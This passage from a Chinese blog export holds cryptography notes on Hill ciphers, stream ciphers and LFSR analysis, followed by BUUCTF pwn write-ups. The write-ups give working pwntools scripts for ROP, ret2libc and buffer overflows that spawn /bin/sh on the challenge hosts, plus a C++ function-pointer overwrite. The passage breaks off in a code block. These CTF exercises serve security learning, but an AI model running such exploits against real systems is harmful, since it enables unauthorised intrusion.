href="#4-希尔密码分析" class="headerlink" title="4. 希尔密码分析"></a>4. 希尔密码分析</h3><p>破译希尔密码的关键是找到转换矩阵，其难以通过唯密文攻击破解，但可以很容易通过已知明文攻击破译。知道明文和密文之后，就可以直接计算出矩阵的值：$Y&#x3D;XK\rightarrow K&#x3D;X^{-1}Y$，前提是需要知道密钥矩阵的阶数。</p><h2 id="四-流密码"><a href="#四-流密码" class="headerlink" title="四. 流密码"></a>四. 流密码</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h3><p>之前的古典密码中对于连续明文元素使用相同密钥K加密，与分组密码的区别是：需要设计复杂的加密函数提高安全性，而且经常需要对明文进行填充以确保分组长度完整。</p><p>流密码将明文看做字符串或者比特串，逐字符或逐位进行加密。为防止密钥穷举，使用与明文长度相等的密钥（无限）流进行加密。关键在于如何生成密钥流。</p><h3 id="2-Vernam-密码"><a href="#2-Vernam-密码" class="headerlink" title="2. Vernam 密码"></a>2. Vernam 密码</h3><p>密钥与明文一样长且没有统计规律的加密。</p><p>加密：$C_i&#x3D;P_i+K_i\mod 26, C_i&#x3D;P_i\oplus K_i$<br>解密：$P_i&#x3D;C_i-K_i\mod 26, P_i&#x3D;C_i\oplus K_i$</p><p>需要构造与明文一样长的随机密钥。（这样的密钥不能重复，否则无法对抗已知明文攻击）</p><h3 id="3-流密码特点"><a href="#3-流密码特点" class="headerlink" title="3. 流密码特点"></a>3. 流密码特点</h3><p>运算简单，实时性强，安全性依赖于密钥流产生方法</p><h3 id="4-流密码分类"><a href="#4-流密码分类" class="headerlink" title="4. 流密码分类"></a>4. 流密码分类</h3><p>按照密钥周期性分类分为周期流密码和非周期流密码<br>周期流密码：存在某一个固定正整数r使得密钥流每隔r个字符以后重复<br>非周期流密码：对于任何正整数密钥都不重复，如一次一密乱码本</p><p>按照密钥产生方式分为同步流密码和异步流密码<br>同步流密码：密钥流的产生独立于消息流，如分组密码中的OFB（输出反馈）模式<br>异步流密码：每一个密钥字符都是由前面n个明文或密文字符推导出来的，其中n为定值。如分组密码中的CFB（密码反馈）模式</p><h3 id="5-同步流密码"><a href="#5-同步流密码" class="headerlink" title="5. 同步流密码"></a>5. 同步流密码</h3><p>使用某种算法，由一个初始密钥变换出于明文串相互独立的密钥流。数学定义如下：</p><p>同步流密码是一个六元组$(P,C,K,L,E,D)$和一个函数$g$，且满足以下条件：</p><ol><li>$P,C,K$分别为明文、密文、密钥的有限集</li><li>$L$是密钥流字母表有限集</li><li>$g$是密钥流生成器，g使用密钥$k\in K$作为输入，产生无限长的密钥流$Z&#x3D;z_1z_2…$，其中$z_1\in L$</li><li>对于任意$z\in L$，都有一个加密规则（函数）$e_z:P\rightarrow C\in E$和相应的解密规则（函数）$d_z:C\rightarrow P\in D$，并且对于每个明文$x\in P$满足$d_z(e_z(x))&#x3D;x$</li></ol><h3 id="6-流密码与分组密码的关系"><a href="#6-流密码与分组密码的关系" class="headerlink" title="6. 流密码与分组密码的关系"></a>6. 流密码与分组密码的关系</h3><p>分组密码可以用于生成密钥序列<br>维吉尼亚密码可以看做流密码的一种特殊情况（一种短周期同步流密码，密钥流是周期为m的密钥序列）</p><h3 id="7-密钥流生成"><a href="#7-密钥流生成" class="headerlink" title="7. 密钥流生成"></a>7. 密钥流生成</h3><p>多使用线性递推关系产生伪随机序列（与多种高级语言的随机函数类似），这一类随机函数需要一个种子，被称为初始向量，线性递推算法可以使用硬件实现，此硬件称为线性反馈移位寄存器（LFSR）</p><h3 id="8-异步流密码"><a href="#8-异步流密码" class="headerlink" title="8. 异步流密码"></a>8. 异步流密码</h3><p>同步流密码存在有周期问题，异步流密码的密钥流由于与明文元素或密文元素有关，因此不存在周期问题。</p><h3 id="9-自动密钥密码体制：异步流密码示例"><a href="#9-自动密钥密码体制：异步流密码示例" class="headerlink" title="9. 自动密钥密码体制：异步流密码示例"></a>9. 自动密钥密码体制：异步流密码示例</h3><p>一个六元组$(P,C,K,L,E,D)$，满足：</p><ol><li>$P&#x3D;C&#x3D;K&#x3D;L&#x3D;Z_{26}$</li><li>密钥流定义：$z_1&#x3D;k\in K, z_i&#x3D;x_{i-1}, i\ge 2$</li><li>对于$\forall z\in K, x,y\in Z_{26}$，定义<br>$$e_z(x)&#x3D;(x+z)\mod 26, d_z(y)&#x3D;(y-z)\mod 26$$</li></ol><h3 id="10-线性移位反馈寄存器-LFSR"><a href="#10-线性移位反馈寄存器-LFSR" class="headerlink" title="10.线性移位反馈寄存器(LFSR)"></a>10.线性移位反馈寄存器(LFSR)</h3><p>对于流密码，需要通过随机序列进行加密，但真正随机的序列难以应用，一般使用一个种子生成出一个伪随机的流密钥。<br>这种方式可以通过硬件方式实现，即LFSR，第n+1位由前面n位中某些位的异或得到。<br>$$a_{n+1}&#x3D;c_na_1\oplus c_{n-1}a_2\oplus …\oplus c_1a_n$$<br>上式中的c<del>i</del>是固定值。</p><p><strong>定义1</strong> 周期序列：存在正整数t，满足对于任意的$k\ge 0,a_{k+t}&#x3D;a_k$，其中最小的正整数t称为序列的周期，序列称为周期序列。<br><strong>定义2</strong> 特征多项式：设q元n级线性反馈移位寄存器的递推公式为：<br>$$a_{n}&#x3D;c_na_0\oplus c_{n-1}a_1\oplus …\oplus c_1a_{n-1},c_i\in F_q,c_n&#x3D;1$$<br>其变换矩阵T定义为<br>$$T&#x3D;\begin{pmatrix}0 &amp; 0 &amp; 0 &amp; … &amp; c_n\<br>1&amp;0&amp;0&amp;…&amp;c_{n-1}\<br>0&amp;1&amp;0&amp;…&amp;c_{n-2}\<br>…&amp;…&amp;…&amp;…&amp;…\<br>0&amp;0&amp;…&amp;1&amp;c_1\end{pmatrix}$$<br>$(a_0,a_1,…,a_{n-1})T&#x3D;(a_1,a_2,…,a_n)$<br>矩阵T的特征多项式$f(x)&#x3D;|xI-T|&#x3D;x^n-c_1x^{n-1}-…-c_{n-1}x-c_n$称为n级线性反馈移位寄存器L的特征多项式<br><strong>定义3</strong> 设T为F<del>q</del>上n级LFSR的变换矩阵，I是n×n单位矩阵，使得T^k^&#x3D;I成立的最小的正整数k称为变换矩阵T的周期，记为$\rho(T)$。<br><strong>定义4</strong> 可满足多项式：设$f(x)\in F_q[x],f(0)\ne 0$，如果$f(T)&#x3D;0$，则称f(x)为T可满足的多项式。所有T可满足的多项式中，次数最低的首1多项式称为T的极小多项式（与信数的极小多项式定义不太相同，这里的多项式不一定不可约），满足$f(x)|x^k-1$的最小正整数称为$f(x)$的周期，记为$\rho(f)$<br><strong><font color=blue>引理1</font></strong> 设$f(x)\in F_q[x]$是首1不可约多项式，$f(0)\ne 0$，则$\rho(f)$等于有限域$F_q[x]<em>{f(x)}$中元素x的阶。<br><strong><font color=blue>引理2</font></strong> 设$f(x)\in F_q[x]$是首1多项式，$f(0)\ne 0,f(x)&#x3D;g(x)^b$，其中$g(x)$为$F_q[x]$中的不可约多项式，$char(F_q)&#x3D;p$，t是使得$p^t\ge b$的最小正整数，则有$\rho(f)&#x3D;\rho(g)p^t$<br>证明：<br>$g(x)|x^{\rho(g)}-1$（拉格朗日定理）$\Rightarrow g(x)^{p^t}|(x^{\rho(g)}-1)^{p^t}$<br>$char(F_q)&#x3D;p,p^t\ge b,g(x)^{p^t}|(x^{\rho(g)}-1)^{p^t}\Rightarrow f(x)|x^{\rho(g)p^t}-1$<br>另一方面，$f(x)|x^{\rho(f)}-1,\therefore f(x)|(x^{\rho(f)}-1,x^{\rho(g)p^t}-1)&#x3D;x^{(\rho(f),\rho(g)p^t)}-1$<br>$\therefore \rho(f)&#x3D;(\rho(f),\rho(g)p^t),\rho(f)|\rho(g)p^t$（信数定理，$\rho(f)$应该是满足$f(x)|x^m-1$的最小次数）<br>同样，$g(x)|f(x)\Rightarrow g(x)|x^{\rho(f)}-1\Rightarrow \rho(g)|\rho(f)$<br>这说明$\rho(f)$是形如$\rho(g)p^s(0\le s\le t)$的整数<br>设$\rho(f)&#x3D;\rho(g)p^s,s&lt;t,p^s&lt;b,f(x)|x^{\rho(g)p^s}-1,g(x)^b|x^{\rho(g)p^s}-1&#x3D;(x^{\rho(g)}-1)^{p^s}$<br>$g(x)^{b-p^s}|(\frac{x^{\rho(g)}-1}{g(x)})^{p^s}\Rightarrow g(x)|(\frac{x^{\rho(g)}-1}{g(x)})^{p^s}\Rightarrow g(x)|(\frac{x^{\rho(g)}-1}{g(x)})\Rightarrow g(x)^2|x^{\rho(g)}-1$（说明$x^{\rho(g)}-1$应该有重因式）<br>$(\rho(g),p)&#x3D;1,(x^{\rho(g)}-1,(x^{\rho(g)}-1)’)&#x3D;1$<br>$\therefore x^{\rho(g)}-1$无重因式，矛盾（信数定理）。故原命题成立<br><strong><font color=blue>引理3</font></strong> 设$f(x)\in F_q[x]$是首1多项式，$f(0)\ne 0$，且$f(x)&#x3D;\prod</em>{i&#x3D;1}^sf_i(x)$，其中$f_i(x)$是$F_q[x]$中两两互素的多项式，则$\rho(f)&#x3D;[\rho(f_1),\rho(f_2),…,\rho(f_s)]$<br>证明：<br>$f_i(x)|x^{\rho(f_i)}-1,\rho(f_i)|[\rho(f_1),\rho(f_2),…,\rho(f_s)]$<br>$\Rightarrow f_i(x)|x^{[\rho(f_1),\rho(f_2),…,\rho(f_s)]}-1$<br>$\Rightarrow \rho(f)|[\rho(f_1),\rho(f_2),…,\rho(f_s)]$（$f_i(x)$两两互素！）<br>又$f_i(x)|f(x),f(x)|x^{\rho(f)}-1$<br>$\Rightarrow f_i(x)|x^{\rho(f)}-1\Rightarrow \rho(f_i)|\rho(f)$<br>$\Rightarrow [\rho(f_1),\rho(f_2),…,\rho(f_s)]|\rho(f)$<br>$\therefore \rho(f)&#x3D;[\rho(f_1),\rho(f_2),…,\rho(f_s)]$<br><strong><font color=red>定理1</font></strong> 设$T$的极小多项式为$h(x)\in F_q[x]$，若$f(x)\in F_q[x]$满足$f(T)&#x3D;0$，那么$h(x)|f(x)$<br><strong><font color=red>定理2</font></strong> 设$T$是$F_q$上n级线性反馈移位寄存器L的变换矩阵，T的特征多项式为$f(x)$，那么$f(x)$是T的极小多项式<br><strong><font color=red>定理3</font></strong> 设$T$是$F_q$上n级线性反馈移位寄存器L的变换矩阵，T的特征多项式为$f(x)$，那么$\rho(T)&#x3D;\rho(f)$<br><strong><font color=red>定理4</font></strong> 给定$F_q$上任意一个非零周期序列$a$，可以找到一个能产生序列$a$的线性反馈移位寄存器L，它的特征多项式$f(x)$满足：对于可产生$a$的任意线性反馈移位寄存器，若其特征多项式为g(x)，都有$f(x)|g(x)$。满足上述条件的f(x)唯一<br><strong><font color=purple>定义5</font></strong> 定理4描述的首1特征多项式f(x)为序列$a$的极小多项式<br><strong><font color=red>定理5</font></strong> 非零周期序列$a$的周期等于其极小多项式f(x)的周期</p><p>m序列的伪随机性：<br>(1) 若t为奇数，则0-1序列的一个周期内0的个数比1的个数多1个或少1个，若t为偶数则其个数相等<br>(2) 在长度为t的周期内，1游程的个数为游程总数的1&#x2F;2，2游程的个数为总数的1&#x2F;2^2^，以此类推。（n游程：连续的n个0或1序列，且前后为1或0。如00110001中第2<del>3为是一个1的2游程）<br>(3) 异相自相关函数为常数（自相关函数：定义在Z</del>2<del>上的周期序列a</del>0<del>a</del>1<del>…则$c_a(\tau)&#x3D;\sum_{i&#x3D;0}^{t-1}\eta(a_i)\eta(a_{i+\tau}),\tau\in Z$，其中$\eta$是Z</del>2~上的加法群到{1,-1}的乘法群的同构$\eta(0)&#x3D;1,\eta(1)&#x3D;-1$，有$\eta(a+b)&#x3D;\eta(a)\eta(b)$）<br>平衡特性：m序列1个数比0个数多1<br>游程特性：1的最大游程为n游程，有且仅有1个；1个0的n-1游程。n&gt;2时，设r为不超过n-2的任一整数，则任何1的r游程数目为$1+\sum_{r&#x3D;1}^{n-2}2^{n-r-2}&#x3D;2^{n-2}$；出现0游程的个数为$2^{n-2}$,游程总数为$2^{n-i}$<br>自相关特性：$c_a(\tau)&#x3D;\sum_{i&#x3D;0}^{2^n-2}\eta(a_i)\eta(a_{i+\tau})&#x3D;2^n-1,\tau\equiv 0(\mod 2^n-1); &#x3D;-1, \tau \ne 0(\mod 2^n-1)$</p><p>异步流密码的加密和解密是一个对称的加解密过程。</p><h4 id="LFSR流密码分析："><a href="#LFSR流密码分析：" class="headerlink" title="LFSR流密码分析："></a>LFSR流密码分析：</h4><p>分析目标为：获取LFSR的结构（即密钥——LFSR的初态z<del>0</del>,z<del>1</del>,…和递推公式[抽头序列c<del>1</del>,c<del>2</del>,…]），使用唯密文攻击较为困难，使用一直明文攻击。<br>$z_k&#x3D;\sum_{j&#x3D;1}^nc_jz_{k-j}$<br>如果能够得到长度不小于2n的明文-密文对，就容易求出其初态和抽头序列（假设n已知）<br>密钥比特流可以直接将明密文求和得到，其中前面的一组作为初态<br>$$(z_n,z_{n+1},…,z_{2n-1})&#x3D;(c_n,c_{n-1},…,c_1)\begin{pmatrix}z_0 &amp; z_1 &amp; … &amp; z_{n-1}\<br>z_1&amp;z_2&amp;…&amp;z_n\<br>…&amp;…&amp;…&amp;…\<br>z_{n-1}&amp;z_n&amp;…&amp;z_{2n-2}\end{pmatrix}$$<br>根据上式可计算$(c_n,c_{n-1},…,c_1)$的值</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn write-ups (6)</title>
      <link href="/2023/02/28/buuctf-pwn-write-ups-6/"/>
      <url>/2023/02/28/buuctf-pwn-write-ups-6/</url>
      
        <content type="html"><![CDATA[<h1 id="buu047-cmcc-simplerop"><a href="#buu047-cmcc-simplerop" class="headerlink" title="buu047-cmcc_simplerop"></a>buu047-cmcc_simplerop</h1><p>和上一道题的思路完全相同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26121</span>)</span><br><span class="line">int80 = <span class="number">0x80493E1</span></span><br><span class="line">popeax_ret = <span class="number">0x80BAE06</span></span><br><span class="line">popedx_ret = <span class="number">0x806e82a</span></span><br><span class="line">popecx_ebx_ret = <span class="number">0x806E851</span></span><br><span class="line">addesp0x14_ret = <span class="number">0x807b36c</span></span><br><span class="line">bss = <span class="number">0x80EB060</span></span><br><span class="line">read = <span class="number">0x806CD50</span></span><br><span class="line">payload = cyclic(<span class="number">0x14</span> + <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read)<span class="comment"># call read()</span></span><br><span class="line">payload += p32(addesp0x14_ret)<span class="comment"># return address, add esp to execute latter ROP</span></span><br><span class="line">payload += p32(<span class="number">0</span>)<span class="comment"># arg #1 of read(): stdin</span></span><br><span class="line">payload += p32(bss)<span class="comment"># arg #2 of read(): a bss address</span></span><br><span class="line">payload += p32(<span class="number">0x8</span>)<span class="comment"># arg #3 of read(): read length</span></span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload += p32(popeax_ret)<span class="comment"># eax = 0x11(SYS_EXECVE)</span></span><br><span class="line">payload += p32(<span class="number">11</span>)</span><br><span class="line">payload += p32(popecx_ebx_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)<span class="comment"># ebx = &#x27;/bin/sh&#x27;</span></span><br><span class="line">payload += p32(bss)<span class="comment"># edx = 0</span></span><br><span class="line">payload += p32(popedx_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)<span class="comment"># ecx = 0</span></span><br><span class="line">payload += p32(int80)<span class="comment"># int 80</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu048-picoctf-2018-buffer-overflow-2"><a href="#buu048-picoctf-2018-buffer-overflow-2" class="headerlink" title="buu048-picoctf_2018_buffer overflow 2"></a>buu048-picoctf_2018_buffer overflow 2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27446</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">0x6C</span>+<span class="number">4</span>) + p32(<span class="number">0x80485CB</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xdeadc0de</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu049-xdctf2015-pwn200"><a href="#buu049-xdctf2015-pwn200" class="headerlink" title="buu049-xdctf2015_pwn200"></a>buu049-xdctf2015_pwn200</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25724</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x6C</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Welcome to XDCTF2015~!\n&#x27;</span>, payload)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write)</span><br><span class="line">base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys = libc.dump(<span class="string">&#x27;system&#x27;</span>) + base</span><br><span class="line">binsh = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) + base</span><br><span class="line">payload = cyclic(<span class="number">0x6C</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu050-bbys-tu-2016"><a href="#buu050-bbys-tu-2016" class="headerlink" title="buu050-bbys_tu_2016"></a>buu050-bbys_tu_2016</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27499</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">0xC</span> + <span class="number">12</span>) + p32(<span class="number">0x804856D</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu051-mrctf2020-easyoverflow"><a href="#buu051-mrctf2020-easyoverflow" class="headerlink" title="buu051-mrctf2020_easyoverflow"></a>buu051-mrctf2020_easyoverflow</h1><p>连上之后输48个无效字节+‘n0t_r3@11y_f1@g’</p><h1 id="buu052-wustctf2020-getshell-2"><a href="#buu052-wustctf2020-getshell-2" class="headerlink" title="buu052-wustctf2020_getshell_2"></a>buu052-wustctf2020_getshell_2</h1><p>这道题只能溢出到返回地址+4字节的地方，直接修改返回地址到system函数的话参数写不进去，所以利用shell函数返回到指令’call _system’的地方，在后面就可以写函数参数’sh’（截取&#x2F;bbbbbbbbin_what_the_f?ck__–??&#x2F;sh的最后两个字节）了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29467</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">24</span>+<span class="number">4</span>) + p32(<span class="number">0x8048529</span>) + p32(<span class="number">0x8048670</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu053-ZJCTF-2019-Login"><a href="#buu053-ZJCTF-2019-Login" class="headerlink" title="buu053-[ZJCTF 2019]Login"></a>buu053-[ZJCTF 2019]Login</h1><p>第一道C++ pwn题。这也是我第一次认真在做一道C++ pwn的题目。<br>当然首先，我们需要会逆向C++程序。C++是C的超集，有很多C中没有的东西。其中最为重要的就是类与对象的识别了。<br>在这一题中，程序的符号表貌似没有被删除，我们可以看到IDA为我们分析出来的各种函数名与类名称。<br><img src="https://img-blog.csdnimg.cn/71aff38bece04a26a36e2d9a3e1ff1e3.png"><br>其中容易发现程序中定义了两个类：User和Admin，而且似乎有三个main中定义的lambda函数。</p><p>程序中无法查看User类的具体结构，因此我们需要手动创建User类结构体，在IDA的Structures窗口中定义：Ins快捷键创建结构体，Del删除结构体，D&#x2F;A&#x2F;*创建结构体成员（常用D），N修改成员名，U删除成员。如下图：（具体为什么要这样定义看下面的分析）<br><img src="https://img-blog.csdnimg.cn/f746484ce3754ae7b30226894ed46457.png"></p><p>通过User类的构造函数发现，构造函数在User，User+8，User+0x58处进行了赋值操作，这里的后面两个均是使用strncpy函数赋值，因此判断是字符串。第一个声明赋值指向的是这样一个结构，有两个函数指针，判断是User类的虚函数表，因为C++类的虚函数表通常都是放在类的最开头位置。可以看到User类中定义了两个虚函数get_password和shell。使用快捷键Y可以修改参数的类型，修改为合适的类型之后，反汇编出来的代码中就不会有一大堆强制转型了，看上去舒服很多。<br><img src="https://img-blog.csdnimg.cn/7cb4c23ae1e5418a82e63d8cc84d1b11.png"><br>又通过User类的get_password方法可以判断出后面两个大小为0x50的字符串中到底哪个是用户名哪个是密码。使用快捷键N可以修改参数或变量的名字，修改之后的User类构造函数如下图：<br><img src="https://img-blog.csdnimg.cn/bf6791a8aeb14847909ccaef41b8f23e.png"><br>另外，在main函数中发现了login变量，其属于User类，且位于bss段中，判断是User类全局变量对象。我们将bss段中的这个对象修改类型发现大小正好符合，说明我们之前定义的User类结构是正确的。<br><img src="https://img-blog.csdnimg.cn/bf45dcdd71764f459b5edd1810b1fd6f.png"><br><img src="https://img-blog.csdnimg.cn/cd88c318d7ee4385a4e21b7ed411a321.png"><br>再看一下Admin类的构造函数，发现其调用了User类的构造函数，因此判断Admin类是User类的子类。<br><img src="https://img-blog.csdnimg.cn/63e222cebc324b75a52166d4b5f3ac64.png"><br>从Admin类虚函数表中含有User类函数也可以说明Admin类是User的子类，且Admin类覆写了User类的shell方法，打开发现User类的shell没有任何作用，而Admin类的shell方法就是直接执行’&#x2F;bin&#x2F;sh’，是一个后门。而get_password类没有覆写，在User类中仅仅是用了virtual声明而已。<br><img src="https://img-blog.csdnimg.cn/7ef08d5aec4f4fabac0726c69a330ec6.png"><br>现在，我们已经将程序中主要的类、对象分析完毕，main函数的前半部分我们可以读懂了。<br><img src="https://img-blog.csdnimg.cn/da71226d729c4aaeb2e5419d62a3c347.png"><br>在main函数中，实例化了一个Admin对象，用户名为admin，密码为2jctf_pa5sw0rd。然后接受用户的输入设置全局User类对象的用户名和密码。</p><p>然后main函数用lambda函数做了一些什么事情，我们进入password_checker的某个函数看一下。<br><img src="https://img-blog.csdnimg.cn/173d05bbcc0e4410b2b2d4e165316c8c.png"><br>这个函数进行密码输入的比较，如果输入密码正确就执行exec函数指针指向的函数。<br>根据这个函数的声明，推测password_checker应该是一个结构体，其中包含了后面的lambda函数（注意这个函数应该是一个定义于password_checker结构体中的lambda函数，注意password_checker与lambda函数之间是以::连接）<br><img src="https://img-blog.csdnimg.cn/5f1b656e104a4a95be5983efb53a5508.png"><br>在password_checker函数中发现了checker结构体的赋值操作，password_checker中只有这一个函数指针存在。<br><img src="https://img-blog.csdnimg.cn/c5e6c8ec278b4fec94deef62617b8ee4.png"><br>因此这一段代码原本的作用是：检查密码是否输入正确，如果正确则执行greeting_func函数：<br><img src="https://img-blog.csdnimg.cn/efc3384eb0684838a1af617e3a303d17.png"><br>但是经过实地运行发现，在lambda函数中会发生段错误，错就错在exec函数指针上。原本指针的值应为0x400A90，但是执行到这里的时候发现已经被改成了0x400090。<br><img src="https://img-blog.csdnimg.cn/af41c306274c4102920ff3da574a1184.jpeg"><br>进一步跟踪调试发现，是strip_newline函数自动识别换行符（ASCII码为0xA），然后给这个地址错误地修改了，变成了一个无效的值。</p><p>这给了我们提示：strip_newline是在lambda函数中调用的，但是却能够修改exec函数的地址，通过调试我们不难发现，exec是一个指针，通过main函数调用password_checker函数获取，但是这是password_checker的局部变量，其地址应该在main函数栈帧的低地址处（main函数实际上没有栈帧，这里类比其他函数的栈帧方便理解），也就是main函数执行时esp的低地址处，而调用其他函数时这里的地址自然就有可能会受到影响。由此可见，如果我们输入密码的时候修改这里的地址值到Admin类的shell函数地址，就能够拿到shell了。</p><p>因此，本题的漏洞点在于返回局部变量的值，属于逻辑错误。子函数返回到父函数的返回值不应该是子函数局部变量的值。漏洞本身不难，但是对于逆向C++而言还是一次很好的训练与学习。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26270</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2jctf_pa5sw0rd\x00\x00&#x27;</span> + p64(<span class="number">0x400E88</span>) * <span class="number">8</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>尝试使用CLion还原出程序的源代码：（C++基础不扎实，尽量还原）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 